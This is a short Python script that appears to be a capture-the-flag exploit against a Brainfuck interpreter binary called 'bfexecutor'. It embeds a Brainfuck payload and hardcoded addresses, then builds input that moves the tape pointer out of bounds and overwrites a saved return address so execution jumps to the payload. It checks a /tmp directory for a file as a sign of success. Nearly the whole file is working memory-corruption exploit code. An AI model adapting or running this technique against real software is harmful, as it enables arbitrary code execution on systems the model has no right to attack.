from os import system, listdir

data = '--[----->+<]>++++.-[->+++<]>.-[-->+++<]>+.>---[----->+<]>.-[-->+<]>----.++[->++++++<]>-.-[->+++<]>+.++[->++<]>.+++++++.+++++.++[->+++++<]>-.-[--->++<]>-.-----------.>.-[--->+<]>--.-----------.---[->++<]>-.-[----->+<]>-.[->++++++<]>--.----[->+++<]>+.-[--->+<]>-.>..-[------->+<]>-.---[->++<]>-.-[----->+<]>--.[------>+<]>+.-----[->+++<]>+.>+++++[->+++++<]>.>...+[------->++<]>++.+++++++++.-----.------------.+++++++.-.[-->+<]>----.[--->++<]>--.[-->+++<]>-.-[--->++<]>.-------.+++.[->+++++<]>-.+[----->+<]>.+++++++++.-----.------------.+++++++.-.++[->+++++<]>-.++.---.[--->++<]>-.+++[->+++<]>+.>.+[--->++<]>.+.---------------.---[->++<]>-.-[----->+<]>--.>+++[->+++++<]>.>+++++.'
# data = ''

# position = 1208
# position = 1176 - 44
max_position = 2000 - 543

ret_addr =        "0000004783e8"
executable_ptr =  "7fffdeadb000"

a = list(reversed([ret_addr[i * 2:i * 2 + 2] for i in range(len(ret_addr) // 2)]))
b = list(reversed([executable_ptr[i * 2:i * 2 + 2] for i in range(len(ret_addr) // 2)]))

# for position in range(max_position):
for position in [1132]:
    s = ['>' * position] + [((int(a[i], 16) - int(b[i], 16) + 256) % 256) * '-' + '>' for i in range(len(a))]

    res = data + ''.join(s)
    # res = ''
    res += (2000 - len(res)) * '>'
    print(('echo "" | ./bfexecutor "{}"'.format(res)))

    if '1' in listdir('/tmp/python'):
        print(position)
        print("done!")
        break
